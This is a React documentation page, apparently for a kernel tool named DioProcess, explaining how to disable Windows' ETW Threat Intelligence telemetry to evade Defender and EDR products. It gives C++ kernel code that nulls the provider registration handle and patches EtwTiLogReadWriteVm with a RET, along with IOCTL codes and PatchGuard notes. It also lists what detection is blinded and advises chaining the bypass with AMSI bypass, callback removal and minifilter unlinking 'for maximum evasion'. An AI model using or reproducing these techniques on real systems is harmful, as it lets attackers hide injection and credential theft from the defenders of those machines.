import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function EtwTiBypassPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">ETW-TI Bypass</h1>
          <Badge variant="outline">Ring 0</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Disable ETW Threat Intelligence sensor to evade Defender and EDR monitoring.
        </p>
      </div>

      <WarningBox variant="danger" title="Detection Evasion">
        This bypasses Microsoft&apos;s primary telemetry sensor for threat detection. 
        Use only for authorized security research.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Overview</h2>
        <p className="text-muted-foreground">
          ETW-TI (Event Tracing for Windows - Threat Intelligence) is Microsoft&apos;s 
          kernel-level telemetry provider that feeds data to Windows Defender and 
          third-party EDRs. Disabling it blinds these security products to many 
          malicious activities.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">What ETW-TI Monitors</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Process creation and termination</li>
          <li>• Thread injection and remote thread creation</li>
          <li>• Memory allocation and protection changes</li>
          <li>• Image (DLL/EXE) loading</li>
          <li>• Handle operations (open, duplicate)</li>
          <li>• Registry modifications</li>
          <li>• Filesystem operations</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Bypass Methods</h2>
        <div className="space-y-4">
          <div className="p-4 rounded-lg border border-border/50 bg-card/50">
            <h4 className="font-semibold mb-2">Method 1: Provider Handle Nullification</h4>
            <p className="text-muted-foreground text-sm">
              Find and null the ETW-TI provider registration handle. Events are 
              queued but never delivered.
            </p>
          </div>
          <div className="p-4 rounded-lg border border-border/50 bg-card/50">
            <h4 className="font-semibold mb-2">Method 2: KeInsertQueueApc Patching</h4>
            <p className="text-muted-foreground text-sm">
              Patch the APC queueing function to skip ETW event APCs. More aggressive 
              but more complete.
            </p>
          </div>
          <div className="p-4 rounded-lg border border-border/50 bg-card/50">
            <h4 className="font-semibold mb-2">Method 3: Hypervisor EPT Hook</h4>
            <p className="text-muted-foreground text-sm">
              Hook ETW functions via EPT to filter events at Ring -1. PatchGuard-safe.
            </p>
          </div>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Implementation</h2>
        <CodeBlock
          language="cpp"
          filename="Provider Handle Method"
          code={`NTSTATUS DisableEtwTi() {
    // 1. Find EtwThreatIntProvRegHandle via signature scanning
    //    This is the handle for the Microsoft-Windows-Threat-Intelligence
    //    ETW provider (GUID: F4E1897C-BB5D-5668-F1D8-040F4D8DD344)
    
    PHANDLE EtwThreatIntProvRegHandle = FindEtwTiHandle();
    if (!EtwThreatIntProvRegHandle) {
        return STATUS_NOT_FOUND;
    }
    
    // 2. Read current handle value
    HANDLE OriginalHandle = *EtwThreatIntProvRegHandle;
    
    // 3. Null the handle - events won't be delivered
    *EtwThreatIntProvRegHandle = NULL;
    
    // Provider is now disabled. To re-enable:
    // *EtwThreatIntProvRegHandle = OriginalHandle;
    
    return STATUS_SUCCESS;
}

// Alternative: Patch EtwTiLogReadWriteVm directly
NTSTATUS PatchEtwTiLogReadWriteVm() {
    // Find function via signature
    PVOID EtwTiLogReadWriteVm = FindPattern(
        ntoskrnl,
        "48 8B C4 48 89 58 08 48 89 68 10..."  // Pattern varies by version
    );
    
    // Patch with RET to disable the function
    BYTE Patch[] = { 0xC3 };  // RET
    WriteKernelMemory(EtwTiLogReadWriteVm, Patch, sizeof(Patch));
    
    return STATUS_SUCCESS;
}`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">IOCTLs</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">IOCTL</th>
                <th className="text-left py-2 px-3 font-semibold">Code</th>
                <th className="text-left py-2 px-3 font-semibold">Description</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">DISABLE_ETW_TI</td>
                <td className="py-2 px-3">0x00222064</td>
                <td className="py-2 px-3 text-muted-foreground">Disable ETW-TI provider</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3 font-mono text-xs">ENABLE_ETW_TI</td>
                <td className="py-2 px-3">0x00222068</td>
                <td className="py-2 px-3 text-muted-foreground">Re-enable ETW-TI provider</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">What Gets Bypassed</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>✓ Windows Defender ATP telemetry</li>
          <li>✓ EDR process injection detection</li>
          <li>✓ Memory tamper detection (VirtualProtect monitoring)</li>
          <li>✓ Thread creation monitoring</li>
          <li>✓ Credential access events</li>
          <li>✓ Most behavioral analysis</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">What Still Works</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Static signature scanning (file-based)</li>
          <li>• AMSI (separate system, use AMSI bypass)</li>
          <li>• Minifilter filesystem monitoring</li>
          <li>• Kernel callbacks (separate system)</li>
          <li>• Network monitoring at driver level</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Kernel Utilities tab → ETW-TI section → <strong>Disable ETW-TI</strong>
        </p>
        <p className="text-muted-foreground mt-4">
          Button shows current state (Enabled/Disabled) and allows toggling.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">PatchGuard Considerations</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>Handle nullification</strong> — Data modification only, PatchGuard-safe</li>
          <li>• <strong>Function patching</strong> — Code modification, may trigger PatchGuard</li>
          <li>• <strong>EPT hooking</strong> — Ring -1 operation, PatchGuard cannot see</li>
        </ul>
        <p className="text-muted-foreground mt-4">
          DioProcess uses handle nullification by default for PatchGuard safety.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Combined with Other Bypasses</h2>
        <p className="text-muted-foreground">
          For maximum evasion, combine ETW-TI bypass with:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <a href="/docs/usermode/amsi-etw-bypass" className="text-violet hover:underline">AMSI Bypass</a> — Disable script scanning</li>
          <li>• <a href="/docs/kernel/callback-enumeration" className="text-violet hover:underline">Callback Removal</a> — Disable kernel callbacks</li>
          <li>• <a href="/docs/kernel-enumeration/minifilters" className="text-violet hover:underline">Minifilter Unlinking</a> — Disable filesystem monitoring</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Use Cases</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Red team operations requiring stealth</li>
          <li>• Security product testing</li>
          <li>• Malware analysis without triggering alerts</li>
          <li>• Research on ETW-based detection</li>
        </ul>
      </section>
    </div>
  );
}
